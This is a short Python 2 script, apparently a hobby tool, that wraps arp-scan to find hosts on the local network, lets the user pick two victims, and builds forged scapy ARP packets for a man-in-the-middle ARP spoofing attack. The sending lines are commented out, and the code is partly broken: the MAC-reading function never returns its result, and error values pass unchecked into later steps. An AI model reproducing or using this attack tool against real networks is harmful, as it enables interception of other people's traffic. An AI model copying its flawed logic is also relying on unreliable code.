#!/usr/bin/python
import sys
import subprocess
import re
from scapy.all import *
import uuid

class ArpSpoofer:
    """Provides arp scan, and ARP spoofing attack(for now default NIC)"""
    def arp_scan(self):
        """arp_scan(self) -> list
        arp-scan wraper return list of devices"""

        print '[+] Scanning for avaliable hosts...'
        try:
            out = subprocess.Popen(['sudo', 'arp-scan', '-l'], stdout=subprocess.PIPE)
            arp_scan = out.stdout.readlines()
            hosts = []
            for host in arp_scan:
                mac = re.search(r'([0-9A-F]{2}[:]){5}([0-9A-F]{2})', host, re.I)
                if mac != None:
                    mac = mac.group()
                    ip = re.search(r'((2[0-5]|1[0-9]|[0-9])?[0-9]\.){3}((2[0-5]|1[0-9]|[0-9])?[0-9])', host, re.I).group()
                    hosts.append([ip,mac])
                    print '[+] Discovered host: ' + host
        except Exception, e:
            print '[-] Scaning hosts failed'
            return -1
        print '[+] Scanning finished \n'
        return hosts

    def choose_hosts(self, hosts):
        """choose_hosts(self, hosts) -> list
           hosts -- list of hosts in format [[ip,mac],...]

           returns list of hosts chosen by user to attack"""
        counter = 0
        chosen_hosts = []
        print 'Host list:\n'
        for host in hosts:
            print 'ID:' + str(counter) + ' IP:' + str(host[0]) + ' MAC:' + str(host[1])
            counter += 1
        try:
            chosen_hosts.append(hosts[int(raw_input('\nChoose first host by selecting ID:'))])
            chosen_hosts.append(hosts[int(raw_input('\nChoose second host by selecting ID:'))])
        except Exception,e :
            print '[-] Provided incorrect value'
            return -1
        return chosen_hosts

    def get_hwaddr(self):
        """get_hwaddr(self) -> str
           returns MAC address as stirng in format:
           aa:aa:aa:aa:aa:aa"""
        print '[+] Reading HW address'
        try:
            my_mac = hex(uuid.getnode()).replace('0x','').replace('L', '')
            zeros_count = 12 - len(my_mac)
            my_mac = zeros_count * '0' + my_mac
            my_mac = ':'.join(my_mac[i : i + 2] for i in range(0, 11, 2))
        except Exception, e:
            print '[-] Filed to read HW adress'
            return -1
        print '[+] HW address readed: ' + my_mac

    def spoof_arp(self, hosts, hwaddr):
        """Arp spoofing attack
           hosts -- matrix of 2 host in format [[ip,mac],[ip,mac]]
           hwaddr -- MAC address of interface in format aa:aa:aa:aa:aa"""
        interface = raw_input('Specify interface to provide attack on');
        if len(hosts) != 2:
            print '[-] Hosts matrix must contain only 2 hosts'
            return -1
        print '[+] Sending ARP Request packets'
        host1_arp = Ether(dst=hosts[0][1])/ARP(hwsrc=hwaddr, pdst=hosts[0][0], psrc=hosts[1][0], op=1)
        host2_arp = Ether(dst=hosts[1][1])/ARP(hwsrc=hwaddr, pdst=hosts[1][0], psrc=hosts[0][0], op=1)
        #host1_arp.show()
        #sendp(host1_arp, iface=interface)
        #sendp(host2_arp, iface=interface)
        print '[+] ARPs sent'

def main():
    print 'Welcome to arp spoofing attac'
    spoofer = ArpSpoofer()
    my_mac = spoofer.get_hwaddr()
    hosts = spoofer.arp_scan()
    hosts = spoofer.choose_hosts(hosts)
    spoofer.spoof_arp(hosts, my_mac)

if __name__ == "__main__":
    sys.exit(main())
